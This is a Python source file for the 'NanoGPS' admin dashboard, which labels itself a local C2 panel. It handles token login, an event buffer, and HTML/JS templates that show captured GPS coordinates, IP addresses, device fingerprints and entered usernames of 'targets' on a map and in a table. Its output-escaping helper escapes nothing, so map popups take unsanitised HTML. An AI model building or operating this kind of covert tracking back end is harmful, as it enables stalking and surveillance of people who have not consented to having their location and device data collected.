"""Local admin dashboard: auth, live event buffer, and HTML templates.

Stdlib only. The dashboard frontend polls JSON APIs (no WebSocket
dependency) and renders GPS hits on a Leaflet map (CDN) with graceful
fallback to the telemetry table when offline.
"""

import hmac
import secrets
import threading
import time
from collections import deque
from html import escape


ADMIN_COOKIE = "nanogps_admin"


def generate_token(num_bytes=32):
    """Generate a URL-safe admin token."""
    return secrets.token_urlsafe(num_bytes)


def tokens_match(provided, expected):
    """Constant-time token comparison (both must be str)."""
    if not provided or not expected:
        return False
    if not isinstance(provided, str) or not isinstance(expected, str):
        return False
    return hmac.compare_digest(provided, expected)


def parse_cookies(cookie_header):
    """Parse a Cookie header into a dict (tolerant, no exceptions)."""
    out = {}
    if not cookie_header:
        return out
    try:
        for part in cookie_header.split(";"):
            if "=" not in part:
                continue
            k, v = part.split("=", 1)
            out[k.strip()] = v.strip().strip('"')
    except Exception:
        pass
    return out


def build_auth_cookie(token, clear=False):
    """Build a Set-Cookie header value for the admin session."""
    if clear:
        return (
            f"{ADMIN_COOKIE}=deleted; Path=/; HttpOnly; SameSite=Lax; "
            "Max-Age=0"
        )
    # No Secure flag: panel is served over localhost HTTP by default.
    return (
        f"{ADMIN_COOKIE}={token}; Path=/; HttpOnly; SameSite=Lax"
    )


class EventBuffer:
    """Thread-safe in-memory ring buffer for live activity.

    Stores lightweight summaries (status messages + hit notifications),
    not full payloads. Full payloads stay in SQLite and are served via
    /api/hits.
    """

    def __init__(self, maxlen=200):
        self._events = deque(maxlen=maxlen)
        self._lock = threading.Lock()
        self._next_id = 1

    def push(self, kind, message, ip=""):
        try:
            with self._lock:
                evt = {
                    "id": self._next_id,
                    "ts": time.strftime("%H:%M:%S"),
                    "kind": str(kind),
                    "message": str(message)[:500],
                    "ip": str(ip)[:64],
                }
                self._events.append(evt)
                self._next_id += 1
                return evt
        except Exception:
            return None

    def fetch(self, since_id=0, limit=100):
        try:
            since_id = int(since_id or 0)
        except (TypeError, ValueError):
            since_id = 0
        limit = max(1, min(int(limit or 100), 200))
        with self._lock:
            items = [e for e in self._events if e["id"] > since_id]
        return items[-limit:]

    def clear(self):
        with self._lock:
            self._events.clear()


class AdminDashboard:
    """HTML templates for the admin panel (static shell + JS polling)."""

    @staticmethod
    def render_login():
        return """<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
<title>NanoGPS Admin Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="dark light">
<style>
body{background:#0f172a;color:#f8fafc;font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;}
.card{width:100%;max-width:360px;background:#1e293b;padding:30px;border-radius:12px;box-shadow:0 4px 25px rgba(0,0,0,.6);text-align:center;}
input{width:100%;padding:10px;margin:12px 0;background:#0f172a;border:1px solid #334155;color:#fff;border-radius:6px;box-sizing:border-box;}
button{width:100%;background:#3b82f6;color:#fff;border:none;padding:12px;border-radius:6px;font-weight:bold;cursor:pointer;}
.err{color:#f87171;font-size:13px;min-height:18px;}
</style>
</head>
<body>
<div class="card">
<h2>🔐 NanoGPS Admin</h2>
<p style="color:#94a3b8;font-size:13px;">Enter the panel token shown in the operator terminal.</p>
<div class="err" id="err"></div>
<input type="password" id="tok" placeholder="Admin token" autocomplete="off">
<button onclick="doLogin()">Unlock Panel</button>
</div>
<script>
async function doLogin(){
  const err=document.getElementById('err');
  err.textContent='';
  try{
    const r=await fetch('/admin/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:document.getElementById('tok').value})});
    if(r.ok){window.location.href='/admin';return;}
    err.textContent='Invalid token.';
  }catch(e){err.textContent='Login failed. Is the server running?';}
}
document.getElementById('tok').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin();});
</script>
</body>
</html>"""

    @staticmethod
    def render_panel():
        return """<!DOCTYPE html>
<html lang="en">
<head>
<title>NanoGPS Admin Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
<style>
:root{--bg:#0f172a;--card:#1e293b;--text:#f8fafc;--muted:#94a3b8;--border:#334155;--accent:#38bdf8;}
*{box-sizing:border-box;}
body{background:var(--bg);color:var(--text);font-family:sans-serif;margin:0;padding:16px;}
header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;flex-wrap:wrap;gap:8px;}
h1{font-size:18px;margin:0;}
.sub{color:var(--muted);font-size:12px;}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:16px;}
.stat{background:var(--card);border-radius:10px;padding:14px;text-align:center;}
.stat b{font-size:24px;display:block;}
.stat span{color:var(--muted);font-size:12px;}
.cols{display:grid;grid-template-columns:1.2fr .8fr;gap:12px;}
@media(max-width:900px){.cols{grid-template-columns:1fr;}}
.panel{background:var(--card);border-radius:10px;padding:14px;min-height:200px;}
.panel h3{margin:0 0 10px;font-size:14px;color:var(--accent);}
#map{height:380px;border-radius:8px;background:#0b1220;}
table{width:100%;border-collapse:collapse;font-size:12px;}
th,td{text-align:left;padding:8px;border-bottom:1px solid var(--border);vertical-align:top;}
th{color:var(--muted);font-weight:normal;}
#events{max-height:300px;overflow-y:auto;font-size:12px;}
.ev{padding:6px 0;border-bottom:1px solid var(--border);}
.ev .ts{color:var(--muted);margin-right:6px;}
.badge{display:inline-block;padding:1px 8px;border-radius:12px;font-size:11px;margin-right:6px;}
.b-geo{background:#052e16;color:#4ade80;}
.b-fp{background:#1e1b4b;color:#a5b4fc;}
.b-status{background:#0c4a6e;color:#7dd3fc;}
button{cursor:pointer;}
.btn{background:transparent;color:var(--text);border:1px solid var(--border);border-radius:6px;padding:6px 12px;}
.btn:hover{border-color:var(--accent);}
.toolbar{display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;}
select,input[type=text]{background:#0f172a;border:1px solid var(--border);color:var(--text);border-radius:6px;padding:6px 8px;font-size:12px;}
</style>
</head>
<body>
<header>
<div><h1>🌐 NanoGPS Admin Dashboard</h1><div class="sub">Local C2 panel · polling every 3s · map via Leaflet/OSM</div></div>
<div><button class="btn" onclick="logout()">Logout</button></div>
</header>
<div class="grid">
<div class="stat"><b id="s-total">–</b><span>Total hits</span></div>
<div class="stat"><b id="s-geo">–</b><span>GPS captures</span></div>
<div class="stat"><b id="s-fp">–</b><span>Telemetry</span></div>
<div class="stat"><b id="s-ev">–</b><span>Live events</span></div>
</div>
<div class="cols">
<div class="panel"><h3>🗺️ GPS Targets</h3><div id="map"></div><div class="sub" id="map-note" style="margin-top:8px;"></div></div>
<div class="panel"><h3>⚡ Live Activity</h3><div id="events"></div></div>
</div>
<div class="panel" style="margin-top:12px;"><h3>🧬 Structured Telemetry</h3>
<div class="toolbar">
<select id="f-type"><option value="">All types</option><option value="GEOLOCATION">GEOLOCATION</option><option value="DEEP_TELEMETRY">DEEP_TELEMETRY</option></select>
<button class="btn" onclick="refresh(true)">Refresh</button>
</div>
<div style="overflow-x:auto;"><table><thead><tr><th>ID</th><th>Time</th><th>IP</th><th>Type</th><th>Summary</th></tr></thead><tbody id="hits"></tbody></table></div>
</div>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
let map=null,markers=[],lastEventId=0;
function initMap(){
  try{
    if(typeof L==='undefined'){document.getElementById('map-note').textContent='Map CDN unavailable — table view still works.';return;}
    map=L.map('map').setView([20,0],2);
    L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:18,attribution:'© OpenStreetMap'}).addTo(map);
  }catch(e){document.getElementById('map-note').textContent='Map init failed.';}
}
function esc(s){return String(s==null?'':s);}
function addRow(h){
  const tr=document.createElement('tr');
  [h.id,h.timestamp,h.ip,h.hit_type].forEach(v=>{const td=document.createElement('td');td.textContent=esc(v);tr.appendChild(td);});
  const td=document.createElement('td');td.textContent=esc(summarize(h));tr.appendChild(td);
  return tr;
}
function summarize(h){
  try{
    const p=JSON.parse(h.payload||'{}');
    if(h.hit_type==='GEOLOCATION')return 'lat='+p.lat+', lon='+p.lon+' acc='+p.acc;
    return (p.inputUser?'user='+p.inputUser+' ':'')+(p.platform||'')+' | '+(p.ua||'').slice(0,80);
  }catch(e){return (h.extra_info||'').slice(0,120);}
}
function plotGeo(list){
  if(!map)return;
  markers.forEach(m=>{try{map.removeLayer(m);}catch(e){}});
  markers=[];
  const pts=[];
  list.forEach(h=>{
    if(h.hit_type!=='GEOLOCATION')return;
    try{
      const p=JSON.parse(h.payload||'{}');
      const lat=parseFloat(p.lat),lon=parseFloat(p.lon);
      if(!isFinite(lat)||!isFinite(lon))return;
      const m=L.marker([lat,lon]).addTo(map).bindPopup('ID '+esc(h.id)+'<br>'+esc(h.ip)+'<br>acc '+esc(p.acc)+'m');
      markers.push(m);pts.push([lat,lon]);
    }catch(e){}
  });
  document.getElementById('map-note').textContent=markers.length+' GPS marker(s) plotted.';
  if(pts.length===1)map.setView(pts[0],13);
  else if(pts.length>1)map.fitBounds(pts);
}
async function refresh(reset){
  try{
    const t=document.getElementById('f-type').value;
    const r=await fetch('/api/hits?limit=100'+(t?'&type='+encodeURIComponent(t):''),{cache:'no-store'});
    if(r.status===401){window.location.href='/admin/login';return;}
    const j=await r.json();
    const tb=document.getElementById('hits');tb.textContent='';
    (j.hits||[]).forEach(h=>tb.appendChild(addRow(h)));
    plotGeo(j.hits||[]);
    const s=await (await fetch('/api/stats',{cache:'no-store'})).json();
    document.getElementById('s-total').textContent=s.total||0;
    document.getElementById('s-geo').textContent=s.geo||0;
    document.getElementById('s-fp').textContent=s.telemetry||0;
  }catch(e){}
}
async function pollEvents(){
  try{
    const r=await fetch('/api/events?since='+lastEventId+'&limit=100',{cache:'no-store'});
    if(r.status===401){window.location.href='/admin/login';return;}
    const j=await r.json();
    const box=document.getElementById('events');
    let evTotal=0;
    (j.events||[]).forEach(e=>{
      lastEventId=Math.max(lastEventId,e.id);
      evTotal+=1;
      const d=document.createElement('div');d.className='ev';
      const ts=document.createElement('span');ts.className='ts';ts.textContent=e.ts+(e.ip?' · '+e.ip:'');
      const b=document.createElement('span');b.className='badge '+(e.kind==='geo'?'b-geo':e.kind==='fingerprint'?'b-fp':'b-status');b.textContent=e.kind;
      const m=document.createElement('span');m.textContent=e.message;
      d.appendChild(ts);d.appendChild(b);d.appendChild(m);
      box.prepend(d);
    });
    document.getElementById('s-ev').textContent=evTotal;
    while(box.children.length>100)box.removeChild(box.lastChild);
  }catch(e){}
}
async function logout(){try{await fetch('/admin/logout',{method:'POST'});}catch(e){}window.location.href='/admin/login';}
initMap();refresh(true);pollEvents();
setInterval(()=>{refresh(false);pollEvents();},3000);
document.getElementById('f-type').addEventListener('change',()=>refresh(true));
</script>
</body>
</html>"""

    @staticmethod
    def render_login_page():
        return AdminDashboard.render_login()

    @staticmethod
    def render_panel_page():
        return AdminDashboard.render_panel()
